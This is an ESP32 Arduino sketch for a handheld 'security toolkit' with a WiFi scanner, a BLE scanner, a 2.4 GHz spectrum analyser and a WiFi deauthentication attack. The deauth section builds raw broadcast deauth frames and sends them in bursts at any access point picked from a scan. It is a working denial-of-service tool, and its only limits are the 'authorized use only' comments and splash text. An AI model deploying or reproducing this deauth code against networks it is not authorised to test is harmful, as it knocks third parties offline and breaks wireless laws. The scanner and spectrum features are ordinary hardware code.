/*
 * ESP32 Security Research Toolkit
 * Hardware: ESP32 DevKitC (CP2102) + SSD1306 0.96" OLED + NRF24L01
 *
 * Wiring:
 *   OLED SSD1306 (I2C 0x3C):
 *     VCC → 3.3V   GND → GND
 *     SDA → GPIO21  SCL → GPIO22
 *
 *   NRF24L01 (SPI + GPIO):
 *     VCC → 3.3V (NOT 5V — will damage module)  GND → GND  [add 10µF cap VCC-GND at module]
 *     CE  → GPIO4   CSN → GPIO5
 *     SCK → GPIO18  MOSI → GPIO23  MISO → GPIO19  IRQ → NC
 *
 *   Buttons (to GND, internal pullup):
 *     BTN_NEXT   → GPIO32
 *     BTN_SELECT → GPIO33
 *
 * Features:
 *   1. WiFi Scanner  — list nearby APs (SSID, RSSI, channel)
 *   2. WiFi Deauth   — 802.11 deauth frames [AUTHORIZED NETWORKS ONLY]
 *   3. BLE Scanner   — list nearby BLE devices (name/MAC, RSSI)
 *   4. NRF Spectrum  — 2.4 GHz spectrum bar graph via NRF24L01 RPD sweep
 *
 * Legal: Use only on networks and devices you own or have explicit written
 *        permission to test. Unauthorized deauth is illegal in Canada and
 *        most jurisdictions.
 */

#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <SPI.h>
#include <RF24.h>

// ── Pin definitions ───────────────────────────────
#define BTN_NEXT   32
#define BTN_SEL    33
#define NRF_CE      4
#define NRF_CSN     5

// ── Peripherals ───────────────────────────────────
Adafruit_SSD1306 oled(128, 64, &Wire, -1);
RF24 radio(NRF_CE, NRF_CSN);

// ── State machine ─────────────────────────────────
enum Mode : uint8_t {
    MENU = 0,
    WIFI_SCAN,
    WIFI_DEAUTH,
    BLE_SCAN,
    NRF_SPECTRUM,
};

Mode mode = MENU;
uint8_t menuSel = 0;
const uint8_t MENU_COUNT = 4;
const char* const MENU_LABELS[MENU_COUNT] = {
    "1 WiFi Scan",
    "2 WiFi Deauth",
    "3 BLE Scan",
    "4 NRF Spectrum",
};

// ── Per-button debounce timestamps  [fix #10] ────
static unsigned long lastBtnNextMs = 0;
static unsigned long lastBtnSelMs  = 0;

static bool pressed_next() {
    if (digitalRead(BTN_NEXT) == LOW && (millis() - lastBtnNextMs) > 220) {
        lastBtnNextMs = millis();
        return true;
    }
    return false;
}

static bool pressed_sel() {
    if (digitalRead(BTN_SEL) == LOW && (millis() - lastBtnSelMs) > 220) {
        lastBtnSelMs = millis();
        return true;
    }
    return false;
}

// ── OLED helpers ──────────────────────────────────
static void oled_header(const char* title) {
    oled.clearDisplay();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(0, 0);
    oled.println(title);
    oled.drawLine(0, 9, 127, 9, SSD1306_WHITE);
    oled.setCursor(0, 12);
}

// ─────────────────────────────────────────────────
// MENU
// ─────────────────────────────────────────────────
static void menu_draw() {
    oled_header("AEL Sec Toolkit");
    for (uint8_t i = 0; i < MENU_COUNT; i++) {
        if (i == menuSel) oled.print("> ");
        else              oled.print("  ");
        oled.println(MENU_LABELS[i]);
    }
    oled.display();
}

static void menu_handle() {
    if (pressed_next()) menuSel = (menuSel + 1) % MENU_COUNT;
    if (pressed_sel())  mode = (Mode)(menuSel + 1);
    menu_draw();
}

// ─────────────────────────────────────────────────
// 1. WIFI SCAN
// ─────────────────────────────────────────────────
static int  wifiCount       = 0;
static int  wifiScroll      = 0;
static bool wifiScanPending = false;

static void wifi_scan_enter() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    wifiCount  = 0;
    wifiScroll = 0;
    oled_header("WiFi Scan");
    oled.println("Scanning... SEL=cancel");
    oled.display();
    WiFi.scanNetworks(true);            // async — loop stays responsive  [fix #12]
    wifiScanPending = true;
}

static void wifi_scan_handle() {
    if (wifiScanPending) {              // poll async result  [fix #12]
        int result = WiFi.scanComplete();
        if (result == WIFI_SCAN_RUNNING) {
            oled_header("WiFi Scan");
            oled.println("Scanning... SEL=cancel");
            oled.display();
            if (pressed_sel()) { wifiScanPending = false; mode = MENU; }
            return;
        }
        wifiCount       = (result < 0) ? 0 : result;
        wifiScanPending = false;
        return;
    }

    oled_header("WiFi Scan");
    if (wifiCount == 0) {
        oled.println("No networks");
        oled.println("SEL=back");
    } else {
        oled.print(wifiCount); oled.println(" found. NEXT/SEL");
        for (int i = wifiScroll; i < min(wifiScroll + 3, wifiCount); i++) {
            // [fix #13] empty SSID = hidden network
            String raw  = WiFi.SSID(i);
            String ssid = raw.length() == 0 ? String("(hidden)") : raw.substring(0, 12);
            oled.print(ssid);
            oled.print(" ch");
            oled.print(WiFi.channel(i));
            oled.print(" ");
            oled.println(WiFi.RSSI(i));
        }
    }
    oled.display();

    // [fix #6] clamp — last page never shows blank lines
    if (pressed_next()) wifiScroll = min(wifiScroll + 1, max(0, wifiCount - 3));
    if (pressed_sel())  { mode = MENU; }
}

// ─────────────────────────────────────────────────
// 2. WIFI DEAUTH  — AUTHORIZED NETWORKS ONLY
// ─────────────────────────────────────────────────
static uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled at runtime)
    0x00, 0x00,                         // Sequence control (set per-frame in deauth_send)
    0x07, 0x00,                         // Reason: class3 from nonassoc STA
};

static int      deauthCount       = 0;
static int      deauthIdx         = 0;
static bool     deauthActive      = false;
static bool     deauthScanPending = false;
static uint16_t deauthSeqNum      = 0;

static void deauth_enter() {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    deauthActive = false;
    deauthCount  = 0;
    deauthIdx    = 0;
    oled_header("WiFi Deauth");
    oled.println("Scanning... SEL=cancel");
    oled.display();
    WiFi.scanNetworks(true);            // async  [fix #12]
    deauthScanPending = true;
}

static void deauth_send(uint8_t* bssid, uint8_t channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);     // [fix #5] raw TX requires promiscuous mode
    memcpy(&deauth_frame[10], bssid, 6);
    memcpy(&deauth_frame[16], bssid, 6);
    for (int i = 0; i < 10; i++) {
        uint16_t sc = (deauthSeqNum & 0xFFF) << 4;  // fragment bits = 0
        deauth_frame[22] = sc & 0xFF;
        deauth_frame[23] = (sc >> 8) & 0xFF;
        deauthSeqNum     = (deauthSeqNum + 1) & 0xFFF;
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        delayMicroseconds(150);
    }
    esp_wifi_set_promiscuous(false);
}

static void deauth_handle() {
    if (deauthScanPending) {            // [fix #12] poll async scan
        int result = WiFi.scanComplete();
        oled_header("WiFi Deauth");
        oled.println("Scanning... SEL=cancel");
        oled.display();
        if (result == WIFI_SCAN_RUNNING) {
            if (pressed_sel()) { deauthScanPending = false; mode = MENU; }
            return;
        }
        deauthCount       = (result < 0) ? 0 : result;
        deauthScanPending = false;
        return;
    }

    if (deauthCount == 0) {             // [fix #16] explicit zero guard before % arithmetic
        oled_header("WiFi Deauth");
        oled.println("No networks found");
        oled.println("SEL=back");
        oled.display();
        if (pressed_sel()) { mode = MENU; }
        return;
    }

    oled_header("WiFi Deauth");
    if (!deauthActive) {
        oled.println(WiFi.SSID(deauthIdx).substring(0, 16));
        oled.print("ch:"); oled.print(WiFi.channel(deauthIdx));
        oled.print("  "); oled.println(WiFi.RSSI(deauthIdx));
        oled.println("NEXT=scroll");
        oled.println("SEL=start deauth");
        oled.display();

        if (pressed_next()) deauthIdx = (deauthIdx + 1) % deauthCount;
        if (pressed_sel())  deauthActive = true;
    } else {
        oled.print("DEAUTHING:\n");
        oled.println(WiFi.SSID(deauthIdx).substring(0, 16));
        oled.println("SEL=stop");
        oled.display();
        deauth_send(WiFi.BSSID(deauthIdx), (uint8_t)WiFi.channel(deauthIdx));
        if (pressed_sel()) {
            deauthActive = false;
            mode = MENU;
        }
    }
}

// ─────────────────────────────────────────────────
// 3. BLE SCAN
// ─────────────────────────────────────────────────
static BLEScan*          bleScan     = nullptr;
static BLEScanResults    bleResults;
static int               bleIdx      = 0;
static volatile bool     bleScanDone = false;

static void onBleScanComplete(BLEScanResults results) {
    bleResults  = results;
    bleScanDone = true;   // written from BLE task; volatile ensures loop() sees it
}

static void ble_scan_enter() {
    WiFi.mode(WIFI_OFF);
    delay(100);
    BLEDevice::init("");                // [fix #15] empty name = no advertising during scan
    bleScan = BLEDevice::getScan();
    bleScan->setActiveScan(true);
    bleScan->setInterval(100);
    bleScan->setWindow(99);
    bleIdx      = 0;
    bleScanDone = false;

    oled_header("BLE Scan");
    oled.println("Scanning 3s...");
    oled.println("SEL=cancel");
    oled.display();
    bleScan->start(3, onBleScanComplete, false);  // non-blocking; loop stays responsive
}

static void ble_scan_handle() {
    if (!bleScanDone) {
        oled_header("BLE Scan");
        oled.println("Scanning 3s...");
        oled.println("SEL=cancel");
        oled.display();
        if (pressed_sel()) { mode = MENU; }  // on_mode_exit stops scan + cleans up
        return;
    }

    int count = bleResults.getCount();
    oled_header("BLE Scan");
    oled.print(count); oled.println(" devices");
    if (count == 0) {
        oled.println("None found");
    } else {
        for (int i = bleIdx; i < min(bleIdx + 3, count); i++) {
            BLEAdvertisedDevice dev = bleResults.getDevice(i);
            String label = dev.haveName()
                ? String(dev.getName().c_str())
                : String(dev.getAddress().toString().c_str());
            oled.print(label.substring(0, 14));
            oled.print(" ");
            oled.println(dev.getRSSI());
        }
    }
    oled.println("NEXT=scroll SEL=back");
    oled.display();

    if (pressed_next()) bleIdx = (bleIdx + 1) % max(1, count);
    if (pressed_sel())  { mode = MENU; }
}

// ─────────────────────────────────────────────────
// 4. NRF24L01 2.4 GHz SPECTRUM ANALYZER
// Sweeps channels 0–125, reads RPD (received power detector)
// per channel, draws live bar graph on OLED.
// ─────────────────────────────────────────────────
#define NRF_CH_COUNT 126
static uint8_t nrfPower[NRF_CH_COUNT];
static bool    nrfOk = false;

static void nrf_spectrum_enter() {
    memset(nrfPower, 0, sizeof(nrfPower));
    nrfOk = radio.begin();
    if (!nrfOk) {
        oled_header("NRF Spectrum");
        oled.println("NRF24 not found!");
        oled.println("Check wiring.");
        oled.display();
        delay(2500);
        mode = MENU;
        return;
    }
    radio.setAutoAck(false);
    radio.setPALevel(RF24_PA_MIN);
    radio.stopListening();
}

static void nrf_sweep() {
    for (uint8_t ch = 0; ch < NRF_CH_COUNT; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(128);
        radio.stopListening();
        if (radio.testRPD()) {
            if (nrfPower[ch] < 248) nrfPower[ch] += 8;  // [fix #7] rise == fall rate
        } else {
            if (nrfPower[ch] > 8)   nrfPower[ch] -= 8;
            else                     nrfPower[ch]  = 0;
        }
    }
}

static void nrf_draw() {
    oled.clearDisplay();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(0, 0);
    oled.println("2.4GHz Spectrum");
    const uint8_t BAR_TOP = 12;
    const uint8_t BAR_H   = 52;
    // [fix #14] group every 2 channels → 63 pairs × 2px = 126px, no collision
    for (uint8_t pair = 0; pair < NRF_CH_COUNT / 2; pair++) {
        uint8_t avg = ((uint16_t)nrfPower[pair * 2] + nrfPower[pair * 2 + 1]) / 2;
        uint8_t x   = pair * 2;
        uint8_t h   = map(avg, 0, 255, 0, BAR_H);
        if (h > 0) {
            oled.drawFastVLine(x,     63 - h, h, SSD1306_WHITE);
            oled.drawFastVLine(x + 1, 63 - h, h, SSD1306_WHITE);
        }
    }
    // WiFi ch1/6/11 → NRF ch12/37/62 → pair 6/18/31 → x 12/36/62
    for (int pair : {6, 18, 31}) {
        oled.drawPixel(pair * 2, BAR_TOP, SSD1306_WHITE);
    }
    oled.display();
}

static void nrf_spectrum_handle() {
    if (!nrfOk) { mode = MENU; return; }
    nrf_sweep();
    nrf_draw();
    if (pressed_sel()) {
        radio.powerDown();
        nrfOk = false;
        mode = MENU;
    }
}

// ─────────────────────────────────────────────────
// Mode teardown — runs before every transition  [fix #4]
// Idempotent: each case guards against double-cleanup.
// ─────────────────────────────────────────────────
static void on_mode_exit(Mode leaving) {
    switch (leaving) {
        case WIFI_SCAN:
        case WIFI_DEAUTH:
            WiFi.scanDelete();
            WiFi.mode(WIFI_OFF);
            break;
        case BLE_SCAN:
            if (bleScan) {
                bleScan->stop();         // halt any in-progress async scan
                bleScan->clearResults();
                BLEDevice::deinit(true);
                bleScan = nullptr;
            }
            bleScanDone = false;
            break;
        case NRF_SPECTRUM:
            if (nrfOk) { radio.powerDown(); nrfOk = false; }
            break;
        default:
            break;
    }
}

// Mode entry dispatcher  [fix #3 — already correct; preserved with teardown wired]
static void on_mode_enter() {
    switch (mode) {
        case WIFI_SCAN:    wifi_scan_enter();    break;
        case WIFI_DEAUTH:  deauth_enter();       break;
        case BLE_SCAN:     ble_scan_enter();     break;
        case NRF_SPECTRUM: nrf_spectrum_enter(); break;
        default: break;
    }
}

// ─────────────────────────────────────────────────
// setup / loop
// ─────────────────────────────────────────────────
static Mode prevMode = MENU;

void setup() {
    Serial.begin(115200);
    pinMode(BTN_NEXT, INPUT_PULLUP);
    pinMode(BTN_SEL,  INPUT_PULLUP);

    Wire.begin(21, 22);
    Wire.setClock(400000);             // 400kHz I2C: ~21ms/frame vs 83ms at default 100kHz
    if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {  // [fix #11 — already correct]
        Serial.println("SSD1306 init failed");
        while (true);
    }
    oled.clearDisplay();
    oled.setTextSize(1);
    oled.setTextColor(SSD1306_WHITE);
    oled.setCursor(20, 10);
    oled.println("AEL Sec Toolkit");
    oled.setCursor(10, 25);
    oled.println("Authorized use only");
    oled.setCursor(0, 45);
    oled.println("WiFi/Deauth/BLE/NRF");
    oled.display();
    delay(2000);
}

void loop() {
    if (mode != prevMode) {
        on_mode_exit(prevMode);        // [fix #4] always teardown before enter
        prevMode = mode;
        if (mode != MENU) on_mode_enter();
    }

    switch (mode) {
        case MENU:         menu_handle();         break;
        case WIFI_SCAN:    wifi_scan_handle();    break;
        case WIFI_DEAUTH:  deauth_handle();       break;
        case BLE_SCAN:     ble_scan_handle();     break;
        case NRF_SPECTRUM: nrf_spectrum_handle(); break;
    }
}
